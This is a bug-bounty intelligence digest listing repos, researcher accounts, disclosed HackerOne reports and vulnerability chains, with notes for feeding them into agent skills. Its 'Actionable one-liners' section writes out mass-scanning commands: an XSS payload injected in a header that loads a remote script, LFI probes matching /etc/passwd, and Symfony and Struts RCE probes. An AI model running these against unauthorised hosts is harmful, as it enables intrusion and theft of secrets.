# GitHub + X/Twitter + Writeups + Reports Intelligence (Auto-Fetched 2026-09-22)

> Curated from public GitHub repos, X/Twitter accounts, HackerOne disclosed reports, and bug bounty writeup aggregators. Deduplicated against existing skills and Telegram intel.

---

## HIGH-VALUE GITHUB REPOS

### Writeup Collections (Curated by Vuln Type)

| Repo | Stars | Focus | Key Content |
|------|-------|-------|-------------|
| [devanshbatham/Awesome-Bugbounty-Writeups](https://github.com/devanshbatham/Awesome-Bugbounty-Writeups) | 6.1K | **Categorized writeups** (XSS, CSRF, IDOR, SSRF, RCE, 2FA, OAuth, etc.) | 300+ writeups organized by bug class |
| [HolyBugx/HolyTips](https://github.com/HolyBugx/HolyTips) | 2K | **Checklists + Notes** | API Security, Auth, File Upload, OAuth checklists (.md + .pdf) |
| [securitycipher/daily-bugbounty-writeups](https://github.com/securitycipher/daily-bugbounty-writeups) | 112 | **Daily updates** (1000+ commits) | OAuth ATO, AI red teaming, IDOR, GraphQL, cache poisoning |
| [kh4sh3i/bug-bounty-writeups](https://github.com/kh4sh3i/bug-bounty-writeups) | 83 | **Categorized** (WebSocket, cache poisoning, IDOR, 2FA, SSRF, RCE) | Cache poisoning chains, IDOR→ATO, deserialization |
| [djadmin/awesome-bug-bounty](https://github.com/djadmin/awesome-bug-bounty) | 5.8K | **Meta-list** (programs, platforms, writeups, methodology) | Getting started, researcher resources, cheatsheets |

### Disclosed Reports Databases

| Repo | Stars | Focus |
|------|-------|-------|
| [ajaysenr/HackerOne-Disclosed-Reports](https://github.com/ajaysenr/HackerOne-Disclosed-Reports) | — | **587 reports (2025)** sorted by bounty amount, severity, votes |
| [bribes/awesome-msrc-writeups](https://github.com/bribes/awesome-msrc-writeups) | 36 | Microsoft MSRC writeups with bounty amounts |
| [iamthefrogy/BountyHound](https://github.com/iamthefrogy/BountyHound) | 81 | **Auto-weekly tracker** of top bug bounty repos |

### Tool Repos (from BountyHound weekly top)

| Repo | Stars | Description |
|------|-------|-------------|
| [hackerone-reports](https://github.com/hackerone-reports) | 6.4K | Top disclosed H1 reports |
| [apkleaks](https://github.com/dwisiswant0/apkleaks) | 6.2K | APK scanner for URIs, endpoints, secrets |
| [awesome-bugbounty-tools](https://github.com/awesome-bugbounty-tools) | 6.1K | Curated tool list |
| [scan4all](https://github.com/hktalent/scan4all) | 6.1K | 15000+ PoCs, 23 vuln types |
| [commix](https://github.com/commixproject/commix) | 5.8K | Automated OS command injection |
| [can-i-take-over-xyz](https://github.com/EdOverflow/can-i-take-over-xyz) | 5.7K | Subdomain takeover service list |
| [GarudRecon](https://github.com/GarudRecon) | 266 | Automated domain recon |
| [bbrecon](https://github.com/bbrecon) | 229 | Python lib for Bug Bounty Recon API |
| [contact.sh](https://github.com/rezadkim/contact.sh) | 268 | OSINT contact finder for reporting |

### Methodology & One-Liners

| Repo | Focus |
|------|-------|
| [emadshanab/Some-BugBounty-Tips-from-my-Twitter-feed](https://github.com/emadshanab/Some-BugBounty-Tips-from-my-Twitter-feed) | **Twitter tips compiled** (Symfony RCE, Struts, AEM, LFI at scale, SSRF, XSS) |
| [KingOfBugbounty/KingOfBugBountyTips](https://github.com/KingOfBugbounty/KingOfBugBountyTips) | One-liner bug bounty scripts |
| [Krishnathakur063/OneLiner_BugBounty](https://github.com/Krishnathakur063/OneLiner_BugBounty) | One-liners |
| [0xlittleboy/One-Liner-Scripts](https://github.com/0xlittleboy/One-Liner-Scripts) | Bash one-liners |
| [notmarshmllow/Bug-Hunting-With-Bash](https://github.com/notmarshmllow/Bug-Hunting-With-Bash) | Bash hunting scripts |
| [inonshk/31-days-of-API-Security-Tips](https://github.com/inonshk/31-days-of-API-Security-Tips) | Daily API security tips (referenced in HolyTips) |
| [jdonsec/AllThingsSSRF](https://github.com/jdonsec/AllThingsSSRF) | SSRF writeups, cheatsheets, videos |

---

## X/TWITTER ACCOUNTS TO FOLLOW

### High-Signal Practitioners

| Handle | Focus | Notable Content |
|--------|-------|-----------------|
| [@m0chan98](https://x.com/m0chan98) | **Volume hunter** (2,679 vulns, 165 critical) | Scope aggregation tool (H1/BC/Intigriti/YesWeHack/Immunefi → PostgreSQL) |
| [@Behi_Sec](https://x.com/Behi_Sec) | **Beginner roadmap + tools** | First Bounty Roadmap (free), ffuf/waybackurls/LinkFinder/Arjun/cloud_enum, wordlists (fuzz4bounty), SQLi payloads, IDOR→$5k ATO, path traversal→$40k RCE |
| [@bountywriteups](https://x.com/bountywriteups) | **Automated writeup aggregation** | Calendar invite chaos, 404 bypass, Cloudflare WAF bypass→DOM XSS |
| [@harshinsecurity](https://x.com/harshinsecurity) | **State of Bug Bounty 2026** | Long-form analysis |
| [@bugbounty_tips](https://x.com/bugbounty_tips) | **Beginner tips + writeups** | InfoSec, jobs |
| [@3th1c_yuk1](https://x.com/3th1c_yuk1) | **CTF + bounty** | CVE-2025-0133, Bucket Vault challenge |
| [@heckintosh_](https://x.com/heckintosh_) | **High-value writeups** | GhostLock CVE-2026-43499 → $92,337 |
| [@Alra3ees](https://x.com/Alra3ees) | **Symfony/Struts/AEM/RCE** | Referenced heavily in emadshanab repo |

### Communities

| Community | Description |
|-----------|-------------|
| [Bug Bounty Write-Ups on X](https://x.com/i/communities/1489229152280530960) | Asset discovery, recon, OSINT, port scanning, cloud assets, leak monitoring |

---

## TOP 2025 HACKERONE DISCLOSED REPORTS (by Bounty)

> Source: [ajaysenr/HackerOne-Disclosed-Reports](https://github.com/ajaysenr/HackerOne-Disclosed-Reports/blob/main/by-year/2025.md) — 587 reports

| Bounty | Title | Program | Severity | Key Technique |
|--------|-------|---------|----------|---------------|
| **$35,000** | Account Takeover via Password Reset without user interactions | GitLab | Critical CVSS 10.0 | Password reset token misuse |
| **$25,000** | `/reports/:id.json` discloses sensitive user data | HackerOne | Critical CVSS 9.2 | IDOR on reports endpoint |
| **$25,000** | Disclosing PolicyPageAssetGroup in Private Programs via `/graphql` | HackerOne | Critical CVSS 9.3 | GraphQL introspection/over-fetching |
| **$15,000** | Groups module halts chain on malicious proposal | Cosmos | High | Governance DoS |
| **$12,500** | Internal Access to HackerOne Confluence Docs | HackerOne | High CVSS 8.2 | SSRF/misconfig |
| **$10,000** | Arbitrary Read of Another User's Private Repository | GitHub | High | AuthZ bypass |
| **$10,000** | `sys_fsc2h_ctrl` kernel stack free | PlayStation | High | Kernel exploit |
| **$8,000** | CVE-2022-40604: Apache Airflow Format String | Internet Bug Bounty | Critical | Format string RCE |
| **$7,500** | Exposed proxy accesses internal Reddit domains | Reddit | High | SSRF/proxy misconfig |
| **$6,000** | Mozilla VPN: RCE via file write + path traversal | Mozilla | High CVSS 8.3 | Path traversal → RCE |
| **$5,580** | Mint OAuth2 access token for targeted user | GitLab | High | OAuth token theft |
| **$5,000** | Blu-ray Disc Java Sandbox Escape (2 vulns) | PlayStation | Medium | Sandbox escape |
| **$4,323** | Sensitive Session Info Leak in Active Storage | IBB | High CVSS 7.2 | Session leakage |
| **$4,323** | CVE-2025-24813: RCE/Info Disclosure | IBB | High | Deserialization/RCE |
| **$3,800** | DoS via Cache Poisoning on cdn.shopify.com | Shopify | Medium CVSS 4.9 | Cache poisoning |
| **$3,500** | Shopify Partners Invitation Privilege Escalation | Shopify | Medium CVSS 4.8 | AuthZ bypass |
| **$2,700** | Public GitHub repos for H1 managed triage | HackerOne | Medium CVSS 5.3 | Info disclosure |
| **$2,162** | Deadlock in x86 HVM standard VGA | IBB | Medium CVSS 5.5 | Kernel DoS |
| **$2,000** | Improper bot-auth impersonation | Basecamp | High | Auth bypass |
| **$2,000** | DNS Rebinding SSRF in Burp Suite MCP Server | PortSwigger | None | DNS rebinding |

### Critical 0-Click ATO Reports (Bounty Hidden)
- **Remitly** — 0-Click ATO via Password Reset [AUTH-3243]
- **Autodesk** — SSRF in Rendering → ATO
- **MTN Group** — SQLi in URL paths, OTP leaked in API response
- **DoD** — Applicant exam attachments accessible
- **Insightly** — Email verification bypass
- **MercadoLibre** — Sale cancellations without restrictions
- **Lichess** — SSRF via Game Export API, weak rate limiting
- **Django** — SQL Injection in FilteredRelation
- **Mars** — ATO in Password Reset, insecure deserialization RCE
- **IBM** — RCE via React Server Components, path traversal
- **curl** — 20+ criticals: HTTP/3 smuggling, path traversal, buffer overflows, credential leaks

---

## KEY WRITEUP PATTERNS (2024-2025)

### High-Impact Chains Observed
| Chain | Example Report | Technique |
|-------|----------------|-----------|
| **IDOR → ATO** | GitLab $35k, TikTok, Autodesk, Bykea | Object ID swap in GraphQL/REST |
| **Cache Poisoning → XSS/DoS** | Shopify $3.8k, Basecamp | Unkeyed headers, path manipulation |
| **SSRF → Internal Access → RCE** | Reddit $7.5k, Lichess, curl | Proxy misconfig, DNS rebinding, file:// |
| **OAuth Redirect → ATO** | securitycipher daily, GitLab | `redirect_uri` validation bypass |
| **Path Traversal → RCE** | Mozilla $6k, curl, Node.js | `file://`, UNC paths, drive letters |
| **Race Condition → Auth Bypass** | Dust, SingleStore, Lichess | Folder creation, workspace limits |
| **Deserialization → RCE** | Mars, Node.js, Django | Pickle, YAML, JSON, PHP `__wakeup` |
| **GraphQL → IDOR/Info Disclosure** | HackerOne $25k, Dust | `__schema` introspection, over-fetching |
| **2FA Bypass → ATO** | Drugs.com, Singlestore, WakaTime | Forced browsing, response manipulation |
| **Subdomain Takeover → Critical** | Mozilla, Shopify, Mars | Unclaimed CNAME, Shopify/GitHub Pages |

### Emerging Target Areas (2025)
1. **AI/LLM Integration** — Prompt injection (Brave Leo), AI model response parsing (Brave)
2. **React Server Components** — RCE via RSC (IBM $35k+)
3. **HTTP/3 & QUIC** — Stream dependency cycles (curl), header injection (QPACK)
4. **MCP (Model Context Protocol)** — DNS rebinding SSRF (PortSwigger)
5. **Supply Chain** — GitHub repo hijacking (retired usernames), CI/CD logs
6. **Mobile/Client** — PlayStation kernel, Nintendo, curl, Mozilla VPN

---

## ACTIONABLE ONE-LINERS (from emadshanab/X)

### Recon at Scale
```bash
# Subdomain enum + httpx + nuclei
crt.sh target.com | httpx | nuclei

# Shodan + nuclei
shodan search org:"target" --fields ip_str,port --separator " " | awk '{print $1":"$2}' | httprobe | nuclei -c 100

# Wayback + XSS hunter
cat domains.txt | waybackurls | httpx -H "User-Agent: \"><script src=$XSS_HUNTER></script>"

# LFI at scale
cat hosts | gau | gf lfi | httpx -paths lfi_wordlist.txt -threads 100 -mr "root:[x*]:0:0:"

# SSRF params
httpx -paths ssrf-parameters.txt -threads 200 -o ssrf.txt
```

### Specific Vuln Scanners
```bash
# Symfony RCE
httpx -l hosts.txt -path "/_fragment?_path=_controller=phpcredits&flag=-1" -mr "PHP Credits"

# Struts S2-016
httpx -l hosts.txt -path /sm/login/loginpagecontentgrabber.do -x GET,POST,PUT -mr "root:x"

# AEM
python3 aem_discoverer.py --file urls.txt
nuclei -l hosts -tags AEM

# .env exposure
httpx -l hosts -path /api/.env -mr "APP_SECRET"

# DB console
httpx -l hosts -path /dbconsole/

# PUT method
cat targets.txt | assetfinder -subs-only | httpx -silent | nuclei -t severity high
```

### Payload Collections
| Type | Source |
|------|--------|
| SQLi | [payloadbox/sql-injection-payload-list](https://github.com/payloadbox/sql-injection-payload-list) |
| XXE | [payloadbox/xxe-injection-payload-list](https://github.com/payloadbox/xxe-injection-payload-list) |
| SSRF params | [lutfumertceylan/top25-parameter/ssrf-parameters.txt](https://github.com/lutfumertceylan/top25-parameter/blob/master/ssrf-parameters.txt) |
| LFI files | [hussein98d/LFI-files](https://github.com/hussein98d/LFI-files) |
| AEM paths | [emadshanab/Adobe-Experience-Manager](https://github.com/emadshanab/Adobe-Experience-Manager) |
| Fuzz wordlists | [0xPugal/fuzz4bounty](https://github.com/0xPugal/fuzz4bounty) (1337 lists) |

---

## INTEGRATION NOTES FOR SKILLS

### bb-methodology
- Add **scope aggregation tool** (m0chan98) to Recon phase
- Add **GraphQL over-fetching** to Tactical Thinking
- Add **AI/LLM prompt injection** to What-If experiments
- Add **React Server Components RCE** to Supply Chain/Environment diff

### bountyforge
- Add **m0chan98 scope tool** to recon-agent
- Add **HolyTips checklists** to API Security, File Upload, OAuth agents
- Add **2025 H1 report patterns** to knowledge base (pre-hunt learning)
- Add **emadshanab one-liners** to flexible PoC execution
- Add **BountyHound weekly tracker** to supervisor triage (auto-update)

### web2-vuln-classes
- **IDOR**: Add GraphQL `deleteProfileInput` (H1 #2633771), TikTok chained IDOR
- **Auth Bypass**: Add 0-click password reset (GitLab, Remitly, Mars, Autodesk)
- **Cache Poisoning**: Add Shopify unkeyed header + path manipulation
- **SSRF**: Add DNS rebinding (PortSwigger MCP), file:// protocol (curl), proxy misconfig (Reddit)
- **RCE**: Add React Server Components (IBM), path traversal (Mozilla, curl, Node.js)
- **GraphQL**: Add `__schema` introspection on private fields (H1 #3000510)
- **Race Conditions**: Add folder creation (Dust), workspace limits (SingleStore)
- **File Upload**: Add SVG XSS (Nextcloud), SVG→RCE (ImageTragic)
- **OAuth**: Add redirect_uri path validation bypass, state parameter CSRF
- **2FA**: Add forced browsing (Drugs.com), response manipulation

### offensive-osint
- Add m0chan98 scope aggregator (PostgreSQL-backed)
- Add BountyHound weekly repo tracker
- Add contact.sh for reporting contacts
- Add Shodan+Censys+Crt.sh pipelines from emadshanab

### recon-and-osint
- Add 31-days-of-API-Security-Tips to API recon
- Add AllThingsSSRF to SSRF recon
- Add fuzz4bounty wordlists to content discovery
- Add GarudRecon/bbrecon to automated pipelines

---

## DEDUPLICATION CHECKLIST

- [ ] HolyTips API Security checklist → merge with web2-vuln-classes API Security (#12) & HolyTips OAuth
- [ ] HolyTips File Upload checklist → merge with web2-vuln-classes File Upload (#9) + Malicious File Upload (Bug0x)
- [ ] HolyTips OAuth checklist → merge with web2-vuln-classes OAuth/OIDC (#8) + postMessage
- [ ] emadshanab Symfony/Struts/AEM/LFI/SSRF → add to web2-vuln-classes specific vuln classes
- [ ] 2025 H1 reports → cross-ref with web2-vuln-classes 27 classes for pattern extraction
- [ ] X accounts → add to bb-methodology "Daily Discipline: Select" for focus areas
- [ ] Tool repos → integrate into bountyforge tool matrix

---

## NEXT ACTIONS

1. **Parse HolyTips PDFs** (API Security 2.7MB, Auth 785KB, File Upload 340KB, OAuth 790KB) for detailed checklists
2. **Fetch individual H1 reports** from ajaysenr repo for top 20 critical/high reports
3. **Download fuzz4bounty wordlists** (1337 lists) for content discovery
4. **Clone BountyHound** for weekly auto-updates
5. **Monitor X accounts** for real-time tips (add to daily routine)